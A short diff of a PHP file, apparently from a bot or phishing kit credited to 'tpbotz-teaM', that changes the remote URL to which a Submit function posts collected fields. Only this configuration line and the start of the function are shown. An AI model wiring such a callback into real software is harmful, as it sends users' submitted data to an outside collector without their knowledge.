@@ -1,6 +1,6 @@
 <?php
 $data=array('by'=>'tpbotz-teaM',
-           'url'=>'https://www.tpbotz-updated.tk/getData.php',
+           'url'=>'https://www.tpbotz-updated.tk/calback.php',
             );
 
 function Submit($url,$fields)
